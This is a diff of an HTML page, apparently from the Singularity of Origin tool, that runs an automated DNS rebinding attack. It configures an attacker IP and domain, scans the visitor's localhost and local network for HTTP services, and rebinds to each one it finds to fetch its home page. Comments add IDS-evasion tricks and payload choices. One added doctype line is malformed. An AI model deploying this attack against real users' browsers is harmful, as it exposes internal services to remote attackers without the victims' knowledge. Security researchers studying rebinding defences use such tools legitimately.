@@ -1,37 +1,94 @@
-<!doctype html>
+<!--
+    A sample fully automated attack that scans a local network for HTTP services,
+    attempts to fetch the home page via DNS rebinding
+    and dumps it to the developer console in case of success.
+    All options are described in more details below.
+-->
+    !doctype html>
 <html lang="en">
 
 <head>
-    <title>Singularity of Origin DNS Rebinding Auto Attack</title>
+    <title>Singularity of Origin DNS Rebinding Automatic Attack</title>
     <script src="manager.js"></script>
     <script src=scan-manager.js></script>
     <meta charset="utf-8">
     <meta http-equiv="x-dns-prefetch-control" content="off">
 </head>
 
-<body>
+<body id="body" style="display: none">
     <script>
         const configuration = {
-            attackHostIPAddress: '80.85.86.45',
-            attackHostDomain: 'dynamic.occalis.net',
+            attackHostIPAddress: '80.85.86.45', // Your attacking server IP address.
+            attackHostDomain: 'dynamic.occalis.net', // Your attacker domain.
+
+            /* Rebinding Strategy section*/
+            // Select one of these strategy per target:
+
+            // "FromQueryFirstThenSecond": 
+            // Default, conservative. Use interval: "20" when choosing this strategy.
             rebindingStrategy: 'FromQueryFirstThenSecond',
-            //const rebindingStrategy = 'FromQueryMultiA',
+
+            // "FromQueryMultiA": 
+            // Multiple DNS answers (fast)
+            // Rebinding in approximately 3 sec. Use interval: "1" when choosing this strategy.
+            // Works against localhost only, specifically:
+            // 0.0.0.0 when target is Linux/macos/Unix, and 127.0.0.1 when target is Windows based. 
+            // rebindingStrategy: 'FromQueryMultiA',
+
+            // "FromQueryRoundRobin": 
+            // Round robin. Slower. Use for IPS/filters evasion or when DNS requests arrive out of sync.
+            // Use for IPS/filters evasion or when DNS requests arrive out of sync.
+            // rebindingStrategy: 'FromQueryRoundRobin',
+
+            // "FromQueryRandom": 
+            // Random. Slower. Use for IPS/filters evasion or when DNS requests arrive out of sync.
+            //  Use for IPS/filters evasion or when DNS requests arrive out of sync.
+            // rebindingStrategy: 'FromQueryRandom',
+
+            /* Rebinding Strategy section ends*/
+
+            // Interval in second to retry detecting a successful rebind. 
+            // Use "20" for all rebinding strategies except for "FromQueryMultiA", where "1" will work.
             interval: "20",
-            indexToken: "<!--thisismytesttoken-->"
+
+            // One of several tricks to determine 
+            // whether we are pointing against the attacker or the victim domain.
+            indexToken: "<!--thisismytesttoken-->",
+
+            // show a blank page or not.
+            hideActivity: false,
+
+            // Rebind a headless browser. Default is false.
+            delayDOMLoad: false,
         };
 
         app.getConfiguration().setManually(configuration);
 
+        // Specify the target address specification below.
+        // IDS evasion tricks - try the following targets: 
+        //   * "0.0.0.0" for Linux/macos/Unix platforms
+        //   * 127.0.0.2
+        //   * "localhost" for Firefox, Chrome
+        //   * a CNAME such as "jenkins.internal-organization-domain.local"
         const addrSpec = `127.0.0.1,0.0.0.0`;
+
+        // Specify a port range to scan and attack
+        // and *ensure* that Singularity listens on all these ports at startup.
         const portSpec = '80,8080-8090';
+
+        // Choose one of Singularity's attack payload to deliver to the victim host or write your own.
+        // 'payload-simple-fetch-get.html' fetches the '/' page of target and log it to the console.
         const payload = 'payload-simple-fetch-get.html';
 
+        // When scanning for services, we need to implement two callbacks:
+        // scanFoundNewTargetCb() is invoked when a target was found to listen for HTTP requests on a given port.
         function scanFoundNewTargetCb(result) {
             console.log(result);
             document.getElementById("activity").innerHTML += JSON.stringify(result, null, 4) + "<br/>";
             app.attackTarget(result.target.address, result.target.port, payload)
         }
 
+        // scanDoneCb() is invoked when the scan was completed.
         function scanDoneCb(results) {
             document.getElementById("activity").innerHTML += "Done.<br/>";
             setTimeout(function () {
@@ -39,7 +96,12 @@
             }, 3000);
         }
 
-        function getLocalIpAddressThenScan2() {
+        // Implement a sample attack
+        // if we can obtain our local IP address (Chrome and Firefox only), 
+        // Then scan 127.0.0.1, 0.0.0.0 and local_ip_address/24
+        // Otherwise scan 127.0.0.1, 0.0.0.0 and 192.168.1.1-254
+        // Then fetch '/' and log to console.
+        function getLocalIpAddressThenScan() {
             sm = ScanManager();
             getLocalIpAddress()
                 .then(address => {
@@ -52,14 +114,15 @@
 
                     })
         }
-
-        getLocalIpAddressThenScan2();
+        // and go!
+        getLocalIpAddressThenScan();
     </script>
 
+    <h3>Scanning Progress</h3>
     <div id="activity"></div>
+    <h3>DNS Rebinding Progress</h3>
     <div id=attackframes></div>
-    <iframe id=delaydomloadframe src="/delaydomload" class="d-none"></iframe>
-
+    <iframe id=delaydomloadframe src="/delaydomload" style="display: none"></iframe>
 </body>
 
 </html>
